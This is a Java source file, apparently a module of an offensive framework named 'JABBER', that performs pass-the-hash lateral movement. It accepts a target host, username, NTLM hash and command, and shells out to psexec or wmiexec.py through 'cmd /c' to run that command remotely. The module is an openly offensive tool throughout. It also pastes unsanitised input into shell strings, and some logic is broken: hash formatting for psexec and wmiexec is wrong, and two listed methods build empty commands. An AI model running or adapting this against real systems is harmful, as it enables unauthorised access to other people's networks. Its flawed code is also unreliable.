package com.jabber.jabber.modules.lateral;

import com.jabber.jabber.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JABBERModule(id="lateral-pth",name="Pass-the-Hash",description="Lateral movement via NTLM hash reuse without plaintext password",category=Category.LATERAL_MOVEMENT,riskLevel=RiskLevel.HIGH,sourceRef="psexec, wmiexec",author="JABBER")
public class PassTheHashModule implements JABBERModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.text("target_host","Target Host/IP").required().placeholder("192.168.1.100").group("Target"),
            ModuleInputField.text("username","Username").required().placeholder("Administrator").group("Target"),
            ModuleInputField.text("ntlm_hash","NTLM Hash (LM:NT)").required().placeholder("aabbccdd11223344:aabbccdd11223344...").group("Credentials"),
            ModuleInputField.select("method","Execution Method",List.of("psexec","wmiexec","smbexec","dcomexec")).group("Method"),
            ModuleInputField.text("command","Command to Execute").required().placeholder("cmd.exe /c whoami").group("Payload"),
            ModuleInputField.checkbox("interactive","Interactive Session").group("Options"),
            ModuleInputField.text("domain","Domain Name").placeholder("DOMAIN").group("Advanced"),
            ModuleInputField.text("advanced_options","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"lateral-pth");
            try{
                String target=input.getOrDefault("target_host","");
                String user=input.getOrDefault("username","");
                String hash=input.getOrDefault("ntlm_hash","");
                String method=input.getOrDefault("method","psexec");
                String cmd=input.getOrDefault("command","");
                String domain=input.getOrDefault("domain","");
                boolean interactive=Boolean.parseBoolean(input.getOrDefault("interactive","false"));

                if(target.isEmpty()||user.isEmpty()||hash.isEmpty()||cmd.isEmpty()){
                    result.fail("Required parameters missing");return result;
                }

                ctx.log("[*] Pass-the-Hash Lateral Movement Starting...");
                ctx.log("[*] Target: "+target);ctx.log("[*] User: "+domain+"\\"+user);
                ctx.log("[*] Method: "+method);ctx.reportProgress(15);

                if(!validateHash(hash)){result.fail("Invalid NTLM hash format");return result;}
                ctx.log("[*] Hash format valid");ctx.reportProgress(25);

                if(!testConnection(target,user,hash)){result.fail("Cannot connect to target");return result;}
                ctx.log("[+] Connected to target");ctx.reportProgress(40);

                ctx.log("[*] Executing command via "+method+"...");
                String output=executeCommand(target,user,hash,method,cmd,domain);
                ctx.reportProgress(65);

                if(output==null){result.fail("Command execution failed");return result;}
                ctx.log("[+] Command executed successfully");ctx.reportProgress(80);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("target",target);
                findings.put("user",domain.isEmpty()?user:domain+"\\"+user);
                findings.put("method",method);
                findings.put("command_output",output.substring(0,Math.min(500,output.length())));
                findings.put("interactive_session",interactive);
                findings.put("lateral_access","Obtained");
                findings.put("impact","Lateral movement to target system without password");
                findings.put("remediation","Restrict NTLM usage, enable SMB signing, disable WMI access, apply segmentation");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private boolean validateHash(String hash){
        String[]parts=hash.split(":");
        return parts.length==2&&parts[0].length()==32&&parts[1].length()==32;
    }

    private boolean testConnection(String target,String user,String hash){
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"cmd","/c","ping -n 1 "+target});
            return p.waitFor()==0;
        }catch(Exception e){return false;}
    }

    private String executeCommand(String target,String user,String hash,String method,String cmd,String domain){
        try{
            String command="";
            if(method.equals("psexec")){
                command="psexec \\\\"+target+" -u "+user+" -p :"+hash+" \""+cmd+"\"";
            }else if(method.equals("wmiexec")){
                command="wmiexec.py -hashes :"+hash+" "+user+"@"+target+" \""+cmd+"\"";
            }
            Process p=Runtime.getRuntime().exec(new String[]{"cmd","/c",command});
            Scanner s=new Scanner(p.getInputStream());
            StringBuilder output=new StringBuilder();
            while(s.hasNextLine())output.append(s.nextLine()).append("\n");
            s.close();
            return output.toString();
        }catch(Exception e){return null;}
    }
}
